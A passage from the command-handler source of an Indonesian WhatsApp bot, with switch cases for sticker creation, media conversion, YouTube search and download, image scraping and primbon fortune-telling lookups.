if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./rikilah/lib/binary')
let eb = await eBinary(text)
reply(eb)
}
break
//=================================================//
case 'dbinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./rikilah/lib/binary')
let db = await dBinary(text)
reply(db)
}
break
//=================================================//
case 'emojimix': {
if (isBan) throw sticBanLu(from)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await rikibos.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await rikibos.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'emoji':
if (isBan) return SticBanLu('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} 🗿`)
titor = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${encodeURI(q)}?apikey=${lolkey}`)
let encmedia = await rikibos.sendImageAsSticker(m.chat, titor, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
break
//=================================================//
case 'attp': {
if (isBan) throw sticBanLu('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 if (!text) throw `Example : ${prefix + command} text`
           await rikibos.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/attp?teks=${text}`, 'RIK', 'BOT', m, {asSticker: true}).catch((err) => reply(mess.error))
}
break
case 'ttp':
if (isBan) throw sticBanLu('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 if (!text) throw `Example : ${prefix + command} text`
veireuue = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=${lolkey}&text=${encodeURI(q)}`)
m.sender = rikibos.sendMessage(m.chat, { sticker: veireuue, contextInfo: {
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, { quoted: fakerikibang })
break
//=================================================//
 /*case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
 if (isBan) throw sticBanLu(from)
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) throw respond
if (!text) throw respond
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await quoted.download()
let { floNime } = require('./rikilah/lib/uploader')
let fatGans = await floNime(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
let FaTiH = await rikibos.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(FaTiH)
}
 break */
//=================================================// 
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw sticBanLu(from)
/*if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 */ // -1 limit 
if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await rikibos.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./rikilah/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await rikibos.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
rikibos.sendMessage(m.chat, { image: buffer }, { quoted: rik })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw sticBanLu(from)
 // //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./rikilah/lib/uploader')
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await rikibos.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: rik })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./rikilah/lib/converter')
let audio = await toAudio(media, 'mp4')
rikibos.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : rik })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./rikilah/lib/converter')
let audio = await toAudio(media, 'mp4')
rikibos.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${rikibos.user.name}.mp3`}, { quoted : rik })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./rikilah/lib/converter')
let audio = await toPTT(media, 'mp4')
rikibos.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:rik})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./rikilah/lib/uploader')
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await rikibos.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: rik })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) throw sticBanLu(from)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./rikilah/lib/uploader')
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case 'yts': case 'ytsearch': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
rikibos.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: rik })
}
break
//=================================================//
case 'google': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
//=================================================//
case 'gimage': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
footer: rikibos.user.name,
buttons: buttons,
headerType: 4
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
})
}
break
//=================================================//
case 'play': case 'ytplay': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: rikibos.user.name,
buttons: buttons,
headerType: 4
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
}
break
//=================================================//
case 'ytmp3': case 'ytaudio': {
if (isBan) throw sticBanLu(from)
let { yta } = require('./rikilah/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
rikibos.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
rikibos.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
}
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (isBan) throw sticBanLu(from)
let { ytv } = require('./rikilah/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
rikibos.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================//
case 'getmusic': {
if (isBan) throw sticBanLu(from)
let { yta } = require('./rikilah/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
rikibos.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
rikibos.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: rik })
}
break
//=================================================//
case 'getvideo': {
if (isBan) throw sticBanLu(from)
let { ytv } = require('./rikilah/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
rikibos.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: rik })
}
break
//=================================================//
case 'pinterest': {
if (isBan) throw sticBanLu(from)
let { pinterest } = require('./rikilah/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: rik })
}
break
//=================================================//
case 'couple': {
if (isBan) throw sticBanLu(from)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: rik })
rikibos.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: rik })
}
break
//=================================================//
case 'coffe': case 'kopi': {
if (isBan) throw sticBanLu(from)
let buttons = [
{buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`,
footer: rikibos.user.name,
buttons: buttons,
headerType: 4
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
}
break
//=================================================//
case 'wallpaper': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./rikilah/lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: rikibos.user.name,
buttons: buttons,
headerType: 4
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
}
break
//=================================================//
case 'wikimedia': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./rikilah/lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
footer: rikibos.user.name,
buttons: buttons,
headerType: 4
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
}
break
//=================================================//
case 'quotesanime': case 'quoteanime': {
if (isBan) throw sticBanLu(from)
let { quotesAnime } = require('./rikilah/lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
footer: 'Press The Button Below',
buttons: buttons,
headerType: 2
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
}
break
//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw sticBanLu(from)
if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos Gans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
rikibos.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) throw sticBanLu(from)
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) throw sticBanLu(from)
